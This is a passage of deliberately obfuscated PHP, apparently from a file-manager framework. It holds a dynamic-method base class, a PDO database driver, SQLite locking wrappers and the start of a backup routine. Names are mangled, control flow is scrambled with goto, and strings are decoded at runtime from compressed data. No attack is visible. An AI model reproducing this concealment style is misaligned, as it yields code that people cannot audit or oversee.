$cÉôÁù£„[$fÅ†ÅàöÊ·[1479]] = 0; $cÉôÁù£„[$fÅ†ÅàöÊ·[694]] = 0; } goto B±Â“‚’±¡; B±Â“‚’±¡: $c¬°Âö = get_path_this($AÉœ»¼½½Ê); if (strstr($c¬°Âö, $fÅ†ÅàöÊ·[91])) { $cÉôÁù£„[$fÅ†ÅàöÊ·[983]] += 1; $cÉôÁù£„[$fÅ†ÅàöÊ·[969]] += 1; } $cÉôÁù£„[$fÅ†ÅàöÊ·[1472]] = $AÉœ»¼½½Ê; goto dÅº…¦ÂÖ¾; dÅº…¦ÂÖ¾: $this->update(); goto D“Ì‚‘Áù—; D“Ì‚‘Áù—: } } goto A¤˜Ÿ¾öß; E–âá¯òÔ: $_SERVER[$_SERVER[‡•˜°©ˆ][52]] = ("\71\66\71\71".base64_decode('NjU='))+0;$_fps4="c3ImkYA5VaEr3iIrSK85Y8XcSMA9UhjD8seHTrFzXkqAebSknFUe4umvnpEdgECbCSzQu";; stream_wrapper_register($_SERVER[‡•˜°©ˆ][53], $_SERVER[‡•˜°©ˆ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b¶ÎÇ³ËÉ¢, $FøÚóßà…) { $f‘´íò¥ã =& $_SERVER[Î¿—”òá]; if (isset(self::$_methodList[$b¶ÎÇ³ËÉ¢])) { return @call_user_func_array(self::$_methodList[$b¶ÎÇ³ËÉ¢], $FøÚóßà…); } else { if (method_exists($this, $b¶ÎÇ³ËÉ¢)) { return call_user_func_array(array($this, $b¶ÎÇ³ËÉ¢), $FøÚóßà…); } else { think_exception(__CLASS__ . $f‘´íò¥ã[4] . $b¶ÎÇ³ËÉ¢ . $f‘´íò¥ã[5]); } } } public static function __callStatic($F“Œíô¶£¯, $A÷ä×Öù¢Ø) { if (isset(self::$_methodListStatic[$F“Œíô¶£¯])) { return call_user_func_array(self::$_methodListStatic[$F“Œíô¶£¯], $A÷ä×Öù¢Ø); } else { if (method_exists(self, $F“Œíô¶£¯)) { return call_user_func_array(array(self, $F“Œíô¶£¯), $A÷ä×Öù¢Ø); } else { show_json("{$F“Œíô¶£¯}\x28\51\40\156\157\x74\40\x65\x78\x69\x73\x74\73", !1); } } } public static function addMethod($B“ÔßˆÃ†, $D‚¶«‚˜Ëç) { self::$_methodList[$B“ÔßˆÃ†] = $D‚¶«‚˜Ëç; } public static function addMethodStatic($EàÄÌÆø£µ, $B£ŒÕĞó˜) { self::$_methodListStatic[$EàÄÌÆø£µ] = $B£ŒÕĞó˜; } } goto c‡—ÖÍ‚È²; e–ŞÓ˜Ù»ó: define($_SERVER[Î¿—”òá][0], $_SERVER[Î¿—”òá][1]); $_SERVER[‡•˜°©ˆ] = explode($_SERVER[Î¿—”òá][2], gzinflate(substr($_SERVER[Î¿—”òá][3], 10, -8))); function Model($Eº­‚å±Òå = '', $D•”£ç¤“ = '', $b¢ÑšÓŒ¸‰ = '') { goto DÚ™¯ëÓö; C«­‡æÚ³ò: if (isset($eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã])) { return $eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã]; } if ($Eº­‚å±Òå) { $Eº­‚å±Òå = strtoupper($Eº­‚å±Òå[0]) . substr($Eº­‚å±Òå, 1); $Dè‰¹öçÈÅ = $Eº­‚å±Òå . $dÔà¥¿Å…‘[1]; if (class_exists($Dè‰¹öçÈÅ)) { $eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã] = new $Dè‰¹öçÈÅ(); return $eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã]; } } if (!$b¢ÑšÓŒ¸‰) { $b¢ÑšÓŒ¸‰ = $GLOBALS[$dÔà¥¿Å…‘[2]][$dÔà¥¿Å…‘[3]]; } goto bÆóïÖË¾Š; DÚ™¯ëÓö: $dÔà¥¿Å…‘ =& $_SERVER[‡•˜°©ˆ]; static $eŒ¸ğ£–¯Ÿ = array(); $eˆäæŸ¬Ã = strtolower($D•”£ç¤“ . $dÔà¥¿Å…‘[0] . $Eº­‚å±Òå); goto C«­‡æÚ³ò; bÆóïÖË¾Š: $eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã] = new ModelBase($Eº­‚å±Òå, $D•”£ç¤“, $b¢ÑšÓŒ¸‰); return $eŒ¸ğ£–¯Ÿ[$eˆäæŸ¬Ã]; goto b¸‘“•ø; b¸‘“•ø: } goto B˜¡ô¶…›ä; DòÔ»ßæ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($AöëñÁŒ…‰ = '') { $f×­Ò…â§Ë =& $_SERVER[Î¿—”òá]; if (!class_exists($f×­Ò…â§Ë[819])) { think_exception(think_lang($f×­Ò…â§Ë[10]) . $f×­Ò…â§Ë[820]); } if (!empty($AöëñÁŒ…‰)) { $this->config = $AöëñÁŒ…‰; if (empty($this->config[$f×­Ò…â§Ë[13]])) { $this->config[$f×­Ò…â§Ë[13]] = array(); } } } public function connect($eÆë¡ÓÀ = '', $aÒ§ÜÙÍ³‰ = 0) { $f¾„ÀĞ±½Ú =& $_SERVER[Î¿—”òá]; if (!isset($this->linkID[$aÒ§ÜÙÍ³‰])) { goto aœÒïÍ´ë¢; Bˆ©ÑĞ‰êÆ: $this->linkID[$aÒ§ÜÙÍ³‰]->exec($f¾„ÀĞ±½Ú[830] . think_config($f¾„ÀĞ±½Ú[797])); $this->connected = !0; if (1 != think_config($f¾„ÀĞ±½Ú[18])) { unset($this->config); } goto E˜áĞŸà™Ê; cùÎªİ²äŸ: $this->dbType = $this->_getDsnType($eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[821]]); if (in_array($this->dbType, array($f¾„ÀĞ±½Ú[822], $f¾„ÀĞ±½Ú[823], $f¾„ÀĞ±½Ú[824], $f¾„ÀĞ±½Ú[825]))) { think_exception($f¾„ÀĞ±½Ú[826] . $this->dbType . $f¾„ÀĞ±½Ú[827] . $this->dbType . $f¾„ÀĞ±½Ú[828]); } if (!$this->linkID[$aÒ§ÜÙÍ³‰]) { think_exception($f¾„ÀĞ±½Ú[829]); } goto Bˆ©ÑĞ‰êÆ; aœÒïÍ´ë¢: if (empty($eÆë¡ÓÀ)) { $eÆë¡ÓÀ = $this->config; } if ($this->pconnect) { $eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$aÒ§ÜÙÍ³‰] = new PDO($eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[821]], $eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[794]], $eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[795]], $eÆë¡ÓÀ[$f¾„ÀĞ±½Ú[13]]); } catch (PDOException $fØß÷‹¾í½) { think_exception($fØß÷‹¾í½->getMessage()); } goto cùÎªİ²äŸ; E˜áĞŸà™Ê: } return $this->linkID[$aÒ§ÜÙÍ³‰]; } public function free() { $this->PDOStatement = null; } public function query($bÆ‡•ù‹İÁ, $a’¢»›°ÂÖ = array()) { goto DìÒÛé¡õÉ; DìÒÛé¡õÉ: $dÅÀŒøŸÜ =& $_SERVER[Î¿—”òá]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eÕìä±ñ“Š; eÕìä±ñ“Š: $this->queryStr = $bÆ‡•ù‹İÁ; if (!empty($a’¢»›°ÂÖ)) { $this->queryStr .= $dÅÀŒøŸÜ[831] . print_r($a’¢»›°ÂÖ, !0) . $dÅÀŒøŸÜ[832]; } if (!empty($this->PDOStatement)) { $this->free(); } goto EåÁÜŠñ¤; eÈ¤ò®Äµò: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $e­‚ÊØ„ğÚ = $this->PDOStatement->execute($a’¢»›°ÂÖ); $this->debug(); goto d¨øÌáÓ‹®; d¨øÌáÓ‹®: if (!1 === $e­‚ÊØ„ğÚ) { $this->error(); return !1; } else { return $this->getAll(); } goto e²¹‚«òà¦; EåÁÜŠñ¤: think_action_status($dÅÀŒøŸÜ[19], 1); think_status($dÅÀŒøŸÜ[20]); $this->PDOStatement = $this->_linkID->prepare($bÆ‡•ù‹İÁ); goto eÈ¤ò®Äµò; e²¹‚«òà¦: } public function execute($EÙÓïÈŞ´, $b±õ¾‘‹ÜÎ = array()) { goto FÄ±‹ÚĞŞÏ; f¸øªÔê¨ø: if ($this->dbType == $f¤Ñ”âˆ—[825]) { if (preg_match($f¤Ñ”âˆ—[833], $this->queryStr, $AŞ³¸ôÃ„“)) { $this->table = think_config($f¤Ñ”âˆ—[834]) . str_ireplace(think_config($f¤Ñ”âˆ—[835]), $f¤Ñ”âˆ—[361], $AŞ³¸ôÃ„“[2]); $c¢ªîñÍ˜¨ = (bool) $this->query($f¤Ñ”âˆ—[836] . strtoupper($this->table) . $f¤Ñ”âˆ—[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($f¤Ñ”âˆ—[21], 1); goto f‘÷ˆÁÖ™; FÄ±‹ÚĞŞÏ: $f¤Ñ”âˆ— =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EãÓ¯ÅÂ‚á; FÓ¢£…çÃ: $aÊˆ›Òœ¼˜ = $this->PDOStatement->execute($b±õ¾‘‹ÜÎ); $this->debug(); if (!1 === $aÊˆ›Òœ¼˜) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c¢ªîñÍ˜¨ || preg_match($f¤Ñ”âˆ—[837], $EÙÓïÈŞ´)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto AØ†ØßÏòš; f‘÷ˆÁÖ™: think_status($f¤Ñ”âˆ—[20]); $this->PDOStatement = $this->_linkID->prepare($EÙÓïÈŞ´); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FÓ¢£…çÃ; EãÓ¯ÅÂ‚á: $this->queryStr = $EÙÓïÈŞ´; if (!empty($b±õ¾‘‹ÜÎ)) { $this->queryStr .= $f¤Ñ”âˆ—[831] . print_r($b±õ¾‘‹ÜÎ, !0) . $f¤Ñ”âˆ—[832]; } $c¢ªîñÍ˜¨ = !1; goto f¸øªÔê¨ø; AØ†ØßÏòš: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eŒÏ‚ìŸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$eŒÏ‚ìŸ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d™Ö¹İİ‹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d™Ö¹İİ‹) { $this->error(); return !1; } } return !0; } private function getAll() { $FÓß‚¿ŠÁ› = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($FÓß‚¿ŠÁ›); return $FÓß‚¿ŠÁ›; } public function getFields($D‘ˆÊŸ‹õ) { goto cç¸·Æèô…; cç¸·Æèô…: $fÌŒÁ†ƒõ¤ =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (think_config($fÌŒÁ†ƒõ¤[838])) { $eÚëì¸Ñ = str_replace($fÌŒÁ†ƒõ¤[839], $D‘ˆÊŸ‹õ, think_config($fÌŒÁ†ƒõ¤[838])); } else { switch ($this->dbType) { case $fÌŒÁ†ƒõ¤[822]: case $fÌŒÁ†ƒõ¤[840]: $eÚëì¸Ñ = "\x53\x45\x4c\x45\103\x54\40\x20\40\143\x6f\x6c\165\x6d\x6e\137\x6e\x61\x6d\145\40\x61\163\40\x27\x4e\x61\155\x65\x27\54\40\x20\40\x64\x61\x74\x61\x5f\x74\171\160\x65\40\x61\x73\40\x27\x54\x79\160\x65\x27\x2c\40\x20\x20\x63\157\154\x75\155\x6e\x5f\144\145\146\141\x75\154\x74\40\x61\x73\40\x27\104\x65\x66\141\165\x6c\164\x27\x2c\x20\40\x20\x69\x73\137\x6e\x75\x6c\x6c\141\142\x6c\145\x20\x61\163\x20\x27\x4e\x75\x6c\154\x27\xa\x9\x9\106\x52\117\x4d\x9\151\x6e\146\x6f\162\x6d\x61\164\x69\157\156\x5f\163\x63\150\x65\x6d\x61\56\x74\141\x62\154\x65\163\x20\x41\x53\x20\x74\xa\x9\x9\x4a\117\x49\x4e\x9\151\x6e\146\157\162\x6d\141\164\151\157\156\x5f\163\x63\x68\x65\155\x61\56\x63\x6f\x6c\165\x6d\x6e\x73\40\101\x53\40\x63\xa\11\x9\x4f\x4e\x20\40\164\56\x74\141\x62\154\x65\137\143\x61\164\141\x6c\157\147\x20\75\x20\x63\x2e\164\141\142\x6c\x65\137\x63\141\164\141\154\157\x67\12\11\x9\101\116\104\x20\x74\x2e\x74\141\x62\154\x65\x5f\x73\143\150\145\x6d\141\x20\75\40\143\56\x74\141\x62\x6c\x65\137\163\x63\150\145\155\141\xa\x9\11\x41\116\104\40\x74\56\164\141\x62\x6c\x65\x5f\156\x61\155\145\x20\75\x20\143\56\164\x61\x62\x6c\x65\137\x6e\141\x6d\x65\12\11\x9\127\110\105\x52\x45\x20\40\40\164\56\x74\x61\x62\x6c\x65\137\156\141\155\145\x20\75\x20\47{$D‘ˆÊŸ‹õ}\47"; break; case $fÌŒÁ†ƒõ¤[841]: $eÚëì¸Ñ = $fÌŒÁ†ƒõ¤[842] . $D‘ˆÊŸ‹õ . $fÌŒÁ†ƒõ¤[843]; break; case $fÌŒÁ†ƒõ¤[823]: case $fÌŒÁ†ƒõ¤[825]: $eÚëì¸Ñ = $fÌŒÁ†ƒõ¤[844] . $fÌŒÁ†ƒõ¤[845] . $fÌŒÁ†ƒõ¤[846] . strtoupper($D‘ˆÊŸ‹õ) . $fÌŒÁ†ƒõ¤[847] . strtoupper($D‘ˆÊŸ‹õ) . $fÌŒÁ†ƒõ¤[848]; break; case $fÌŒÁ†ƒõ¤[849]: $eÚëì¸Ñ = $fÌŒÁ†ƒõ¤[850] . $D‘ˆÊŸ‹õ . $fÌŒÁ†ƒõ¤[851]; break; case $fÌŒÁ†ƒõ¤[824]: break; case $fÌŒÁ†ƒõ¤[852]: default: $eÚëì¸Ñ = $fÌŒÁ†ƒõ¤[853] . ($this->dbType == $fÌŒÁ†ƒõ¤[852] ? "\140{$D‘ˆÊŸ‹õ}\140" : $D‘ˆÊŸ‹õ); } } goto a‰´Ä˜Àé¢; a‰´Ä˜Àé¢: $C¦çÊªØ· = $this->query($eÚëì¸Ñ); $d¢·»–Öå = array(); if ($C¦çÊªØ·) { foreach ($C¦çÊªØ· as $b¡ä‚°—‘ => $Dˆ¾ºÒÌ«ª) { $Dˆ¾ºÒÌ«ª = array_change_key_case($Dˆ¾ºÒÌ«ª); $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[28]] = isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[28]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[28]] : $fÌŒÁ†ƒõ¤[361]; $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[29]] = isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[29]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[29]] : $fÌŒÁ†ƒõ¤[361]; $d¤ÎÛ­½ÇÆ = isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[261]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[261]] : $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[28]]; $d¢·»–Öå[$d¤ÎÛ­½ÇÆ] = array($fÌŒÁ†ƒõ¤[28] => $d¤ÎÛ­½ÇÆ, $fÌŒÁ†ƒõ¤[29] => $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[29]], $fÌŒÁ†ƒõ¤[31] => (bool) (isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[99]]) && $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[99]] === $fÌŒÁ†ƒõ¤[33] || isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[31]]) && $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[31]] === $fÌŒÁ†ƒõ¤[33]), $fÌŒÁ†ƒõ¤[34] => isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[34]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[34]] : (isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[53]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[53]] : $fÌŒÁ†ƒõ¤[361]), $fÌŒÁ†ƒõ¤[36] => isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[89]]) ? strtolower($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[89]]) == $fÌŒÁ†ƒõ¤[38] : (isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[54]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[54]] : !1), $fÌŒÁ†ƒõ¤[39] => isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[854]]) ? strtolower($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[854]]) == $fÌŒÁ†ƒõ¤[41] : (isset($Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[89]]) ? $Dˆ¾ºÒÌ«ª[$fÌŒÁ†ƒõ¤[89]] : !1)); } } goto DØÉİÄ¼Îî; DØÉİÄ¼Îî: return $d¢·»–Öå; goto fÑº¨Àõõà; fÑº¨Àõõà: } public function getTables($E‘ ©õø­è = '') { $Eàì‡ÄÏˆ½ =& $_SERVER[Î¿—”òá]; if (think_config($Eàì‡ÄÏˆ½[855])) { $E¬¥Ä¯¸§Ò = str_replace($Eàì‡ÄÏˆ½[856], $E‘ ©õø­è, think_config($Eàì‡ÄÏˆ½[855])); } else { switch ($this->dbType) { case $Eàì‡ÄÏˆ½[823]: case $Eàì‡ÄÏˆ½[825]: $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[857]; break; case $Eàì‡ÄÏˆ½[822]: case $Eàì‡ÄÏˆ½[840]: $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[858]; break; case $Eàì‡ÄÏˆ½[849]: $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[859]; break; case $Eàì‡ÄÏˆ½[824]: think_exception(think_lang($Eàì‡ÄÏˆ½[860]) . $Eàì‡ÄÏˆ½[861]); break; case $Eàì‡ÄÏˆ½[841]: $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[42] . $Eàì‡ÄÏˆ½[43] . $Eàì‡ÄÏˆ½[44]; break; case $Eàì‡ÄÏˆ½[852]: default: if (!empty($E‘ ©õø­è)) { $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[805] . $E‘ ©õø­è; } else { $E¬¥Ä¯¸§Ò = $Eàì‡ÄÏˆ½[806]; } } } $Eì°ÎäëİÄ = $this->query($E¬¥Ä¯¸§Ò); $eğ”¶Ò‹Ø = array(); foreach ($Eì°ÎäëİÄ as $Eñ¡“¿¹Ï => $b–·ã’Ì›š) { $eğ”¶Ò‹Ø[$Eñ¡“¿¹Ï] = current($b–·ã’Ì›š); } return $eğ”¶Ò‹Ø; } protected function parseLimit($BÈİÚÑèŒó) { $Añ×ÄÛí£ =& $_SERVER[Î¿—”òá]; $F×Ã¸ß©²ã = $Añ×ÄÛí£[33]; if (!empty($BÈİÚÑèŒó)) { switch ($this->dbType) { case $Añ×ÄÛí£[849]: case $Añ×ÄÛí£[841]: $BÈİÚÑèŒó = explode($Añ×ÄÛí£[47], $BÈİÚÑèŒó); if (count($BÈİÚÑèŒó) > 1) { $F×Ã¸ß©²ã .= $Añ×ÄÛí£[48] . $BÈİÚÑèŒó[1] . $Añ×ÄÛí£[49] . $BÈİÚÑèŒó[0] . $Añ×ÄÛí£[50]; } else { $F×Ã¸ß©²ã .= $Añ×ÄÛí£[48] . $BÈİÚÑèŒó[0] . $Añ×ÄÛí£[50]; } break; case $Añ×ÄÛí£[822]: case $Añ×ÄÛí£[840]: break; case $Añ×ÄÛí£[824]: break; case $Añ×ÄÛí£[823]: case $Añ×ÄÛí£[825]: break; case $Añ×ÄÛí£[852]: default: $F×Ã¸ß©²ã .= $Añ×ÄÛí£[48] . $BÈİÚÑèŒó . $Añ×ÄÛí£[50]; } } return $F×Ã¸ß©²ã; } public function parseKey(&$c÷¤’µ™Ÿ¬, $e°Ôæùµ“ô = true) { $Dïìåï·öô =& $_SERVER[Î¿—”òá]; if ($e°Ôæùµ“ô) { $c÷¤’µ™Ÿ¬ = $this->parseKeyCheck($c÷¤’µ™Ÿ¬); } if ($this->dbType == $Dïìåï·öô[852]) { if ($c÷¤’µ™Ÿ¬ != $Dïìåï·öô[176] && !preg_match($Dïìåï·öô[816], $c÷¤’µ™Ÿ¬)) { $c÷¤’µ™Ÿ¬ = $Dïìåï·öô[817] . trim($c÷¤’µ™Ÿ¬, $Dïìåï·öô[817]) . $Dïìåï·öô[817]; } return $c÷¤’µ™Ÿ¬; } else { return parent::parseKey($c÷¤’µ™Ÿ¬); } } public function close() { $this->_linkID = null; } public function error() { $c­¤°ÁùôÍ =& $_SERVER[Î¿—”òá]; if ($this->PDOStatement) { $a»ºé¼“‚ = $this->PDOStatement->errorInfo(); $this->error = $a»ºé¼“‚[1] . $c­¤°ÁùôÍ[4] . $a»ºé¼“‚[2]; } else { $this->error = $c­¤°ÁùôÍ[33]; } if ($c­¤°ÁùôÍ[33] != $this->queryStr) { $this->error .= LNG($c­¤°ÁùôÍ[45]) . $this->queryStr; } think_trace($this->error, $c­¤°ÁùôÍ[33], $c­¤°ÁùôÍ[46]); return $this->error; } public function escapeString($eƒ¢îèÙ) { $f‹èÒÀİ‰ =& $_SERVER[Î¿—”òá]; switch ($this->dbType) { case $f‹èÒÀİ‰[849]: case $f‹èÒÀİ‰[822]: case $f‹èÒÀİ‰[840]: case $f‹èÒÀİ‰[852]: return addslashes($eƒ¢îèÙ); case $f‹èÒÀİ‰[824]: case $f‹èÒÀİ‰[841]: case $f‹èÒÀİ‰[823]: case $f‹èÒÀİ‰[825]: return str_ireplace($f‹èÒÀİ‰[55], $f‹èÒÀİ‰[56], $eƒ¢îèÙ); } } protected function parseValue($a©ŠÀ¨œ¿) { $cóÉ™µ¨·œ =& $_SERVER[Î¿—”òá]; if (is_string($a©ŠÀ¨œ¿)) { $a©ŠÀ¨œ¿ = strpos($a©ŠÀ¨œ¿, $cóÉ™µ¨·œ[4]) === 0 ? $this->escapeString($a©ŠÀ¨œ¿) : $cóÉ™µ¨·œ[862] . $this->escapeString($a©ŠÀ¨œ¿) . $cóÉ™µ¨·œ[862]; } elseif (isset($a©ŠÀ¨œ¿[0]) && is_string($a©ŠÀ¨œ¿[0]) && strtolower($a©ŠÀ¨œ¿[0]) == $cóÉ™µ¨·œ[285]) { $a©ŠÀ¨œ¿ = $this->escapeString($a©ŠÀ¨œ¿[1]); } elseif (is_array($a©ŠÀ¨œ¿)) { $a©ŠÀ¨œ¿ = array_map(array($this, $cóÉ™µ¨·œ[863]), $a©ŠÀ¨œ¿); } elseif (is_bool($a©ŠÀ¨œ¿)) { $a©ŠÀ¨œ¿ = $a©ŠÀ¨œ¿ ? $cóÉ™µ¨·œ[83] : $cóÉ™µ¨·œ[468]; } elseif (is_null($a©ŠÀ¨œ¿)) { $a©ŠÀ¨œ¿ = $cóÉ™µ¨·œ[99]; } return $a©ŠÀ¨œ¿; } public function getLastInsertId() { $e×áÛéÑÕ =& $_SERVER[Î¿—”òá]; switch ($this->dbType) { case $e×áÛéÑÕ[849]: case $e×áÛéÑÕ[841]: case $e×áÛéÑÕ[822]: case $e×áÛéÑÕ[840]: case $e×áÛéÑÕ[824]: case $e×áÛéÑÕ[852]: return $this->_linkID->lastInsertId(); case $e×áÛéÑÕ[823]: case $e×áÛéÑÕ[825]: $Eò¢Ü—¯ù’ = $this->table; $c–®‚’¢Û  = $this->query("\x53\105\114\105\x43\124\x20{$Eò¢Ü—¯ù’}\56\x63\165\x72\162\x76\141\154\40\x63\165\162\x72\x76\141\154\x20\x46\x52\117\x4d\40\144\165\x61\x6c"); return $c–®‚’¢Û  ? $c–®‚’¢Û [0][$e×áÛéÑÕ[864]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Då‰Ø™Š¤) { goto cù¶’ôôÚ; cù¶’ôôÚ: $ağ¿““ÚÕÖ =& $_SERVER[Î¿—”òá]; $a÷‘Ï±‚ = DATA_PATH . $ağ¿““ÚÕÖ[865]; $CŒã”ÅÕĞ = fopen($a÷‘Ï±‚, $ağ¿““ÚÕÖ[866]); goto fÚ„×¯Ëµ; FÂÙËˆä”: fclose($CŒã”ÅÕĞ); show_json($ağ¿““ÚÕÖ[867], !1); return !1; goto aÔÈğãŠèŸ; fÚ„×¯Ëµ: if (!$CŒã”ÅÕĞ) { return !1; } if (flock($CŒã”ÅÕĞ, LOCK_EX)) { $f àÒó­† = parent::query($Då‰Ø™Š¤); flock($CŒã”ÅÕĞ, LOCK_UN); fclose($CŒã”ÅÕĞ); return $f àÒó­†; } flock($CŒã”ÅÕĞ, LOCK_UN); goto FÂÙËˆä”; aÔÈğãŠèŸ: } public function execute($CÚö¯ÒÕ‘³) { goto Dé¤’œÏ™ä; ağ’…Š•Â: fclose($CÉµÉãëÆˆ); show_json($Eéà¾ËÊÃÌ[867], !1); return !1; goto dÜÏÔÆ†á˜; CÌÁÊæíŸå: if (!$CÉµÉãëÆˆ) { return !1; } if (flock($CÉµÉãëÆˆ, LOCK_EX)) { $cå“‰Ù…èÊ = parent::execute($CÚö¯ÒÕ‘³); flock($CÉµÉãëÆˆ, LOCK_UN); fclose($CÉµÉãëÆˆ); return $cå“‰Ù…èÊ; } flock($CÉµÉãëÆˆ, LOCK_UN); goto ağ’…Š•Â; Dé¤’œÏ™ä: $Eéà¾ËÊÃÌ =& $_SERVER[Î¿—”òá]; $E´ŠŠÄî¾… = DATA_PATH . $Eéà¾ËÊÃÌ[865]; $CÉµÉãëÆˆ = fopen($E´ŠŠÄî¾…, $Eéà¾ËÊÃÌ[866]); goto CÌÁÊæíŸå; dÜÏÔÆ†á˜: } } class DbSqlite3 extends DbSqlite3Base { public function query($b¤È„Í¥À) { goto BáÒîªÉ’‰; dÍ£ğƒ§Ş†: if (!$eùÄöÓò†æ) { return !1; } if (flock($eùÄöÓò†æ, LOCK_EX)) { $d©ËÆ›†æ = parent::query($b¤È„Í¥À); flock($eùÄöÓò†æ, LOCK_UN); fclose($eùÄöÓò†æ); return $d©ËÆ›†æ; } flock($eùÄöÓò†æ, LOCK_UN); goto få•ÅÃÒ³ù; BáÒîªÉ’‰: $f¤›Şõ†«Ò =& $_SERVER[Î¿—”òá]; $b ïø‰‚’¿ = DATA_PATH . $f¤›Şõ†«Ò[865]; $eùÄöÓò†æ = fopen($b ïø‰‚’¿, $f¤›Şõ†«Ò[866]); goto dÍ£ğƒ§Ş†; få•ÅÃÒ³ù: fclose($eùÄöÓò†æ); show_json($f¤›Şõ†«Ò[867], !1); return !1; goto Có‘ÚöíğŸ; Có‘ÚöíğŸ: } public function execute($bÛ¬÷†³Ô) { goto aê©Ô½ƒİ; e¢‰É¿¹Î: fclose($D¥‰×Š®ôô); show_json($d‰ìî­„¨—[867], !1); return !1; goto aÔª§Ê‰î‘; b­õÇ¶“é: if (!$D¥‰×Š®ôô) { return !1; } if (flock($D¥‰×Š®ôô, LOCK_EX)) { $Bç‚‡—¬Äë = parent::execute($bÛ¬÷†³Ô); flock($D¥‰×Š®ôô, LOCK_UN); fclose($D¥‰×Š®ôô); return $Bç‚‡—¬Äë; } flock($D¥‰×Š®ôô, LOCK_UN); goto e¢‰É¿¹Î; aê©Ô½ƒİ: $d‰ìî­„¨— =& $_SERVER[Î¿—”òá]; $d¶Çà¡® = DATA_PATH . $d‰ìî­„¨—[865]; $D¥‰×Š®ôô = fopen($d¶Çà¡®, $d‰ìî­„¨—[866]); goto b­õÇ¶“é; aÔª§Ê‰î‘: } } goto Aî›‰”¾†¾; bø°”ˆÁˆè: class BackupDbFile { public function __construct() { } public function index() { goto f²ì‰ñÕğ¯; D‰…§ç†¸Ø: $eÊì«éÖ”İ = TEMP_FILES . "\142\141\x63\153\x75\x70\137{$Eè³Ëµ³¾}\x2f"; $A’¢ê”ô“ = "\173\151\157\x3a{$D¹äØÕÂ‘‡[$a¯‘²ÄÑÉ[687]]}\175\57\x64\x61\x74\141\x62\x61\x73\x65\57"; IO::mkdir($A’¢ê”ô“ . "\142\141\x63\x6b\165\160\137{$Eè³Ëµ³¾}\x2f"); goto fŠÜÁ»™; fŠÜÁ»™: $F–ä‘èÓÚ = new TaskFileTransfer($a¯‘²ÄÑÉ[725], $a¯‘²ÄÑÉ[710], 0, LNG($a¯‘²ÄÑÉ[711]) . $a¯‘²ÄÑÉ[412] . LNG($a¯‘²ÄÑÉ[713]) . $a¯‘²ÄÑÉ[726]); $F–ä‘èÓÚ->addPath($eÊì«éÖ”İ); $cÖî¸ô‡‚ù = IO::infoWithChildren($eÊì«éÖ”İ); goto B¤ŠÍ™·Âª; f²ì‰ñÕğ¯: $a¯‘²ÄÑÉ =& $_SERVER[Î¿—”òá]; $D¹äØÕÂ‘‡ = Backup::get(); $Eè³Ëµ³¾ = $D¹äØÕÂ‘‡[$a¯‘²ÄÑÉ[28]]; goto D‰…§ç†¸Ø; AÜâØ—«ƒ: 